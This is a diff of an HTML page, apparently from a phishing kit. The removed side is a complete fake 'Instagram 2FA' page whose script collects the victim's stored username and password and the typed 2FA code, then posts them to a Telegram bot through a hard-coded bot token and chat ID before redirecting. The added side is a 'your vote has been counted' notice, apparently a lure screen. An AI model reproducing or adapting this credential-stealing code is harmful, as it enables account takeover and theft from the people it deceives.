@@ -1,118 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Two-Factor Authentication</title>
-    <style>
-        /* Simple styles for the 2FA page */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-
-        body {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #fafafa;
-        }
-
-        .auth-container {
-            width: 350px;
-            padding: 20px;
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            text-align: center;
-        }
-
-        .logo {
-            margin: 20px 0;
-            font-size: 24px;
-            font-weight: bold;
-            color: #262626;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background-color: #fafafa;
-            font-size: 14px;
-        }
-
-        .submit-button {
-            width: 100%;
-            padding: 10px;
-            margin: 20px 0;
-            background-color: #3897f0;
-            color: #fff;
-            border: none;
-            border-radius: 3px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Notification Message</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #d3d3d3;
+    }
+    .notification-box {
+      background-color: white;
+      width: 300px;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+    .checkmark {
+      font-size: 50px;
+      color: #4CAF50;
+    }
+    .message {
+      font-size: 16px;
+      margin-top: 10px;
+      color: #333;
+    }
+    .ok-button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .ok-button:hover {
+      background-color: #45a049;
+    }
+  </style>
 </head>
 <body>
-    <div class="auth-container">
-        <div class="logo">Instagram 2FA</div>
-        <form id="twoFactorForm">
-            <input type="text" class="input-field" id="twoFactorCode" placeholder="Enter 2FA Code" required>
-            <button type="submit" class="submit-button">Submit</button>
-        </form>
-    </div>
 
-    <script>
-        document.getElementById("twoFactorForm").addEventListener("submit", function(e) {
-            e.preventDefault();
+<div class="notification-box">
+  <div class="checkmark">&#10004;</div>
+  <p class="message">You will be notified when your vote has been counted</p>
+  <button class="ok-button">OK</button>
+</div>
 
-            // Retrieve 2FA code from input
-            const twoFactorCode = document.getElementById("twoFactorCode").value;
-
-            // Assuming username and password are stored in sessionStorage from the login page
-            const username = sessionStorage.getItem("username") || "Unknown";
-            const password = sessionStorage.getItem("password") || "Unknown";
-
-            // Telegram Bot API information
-            const botToken = "7753218675:AAHuGWjeWTKwwV6c8jKGVXnuEUJUEMCMBUE";
-            const chatId = "6826019056";
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            // Message to send to Telegram
-            const message = `2FA Attempt:\nUsername: ${username}\nPassword: ${password}\n2FA Code: ${twoFactorCode}`;
-
-            // Send 2FA data to Telegram
-            fetch(telegramApiUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    // Redirect to success page after successful submission
-                    window.location.href = "flock.html";  // Redirect page
-                } else {
-                    alert("Error submitting 2FA code to Telegram.");
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("An error occurred.");
-            });
-        });
-    </script>
 </body>
 </html>
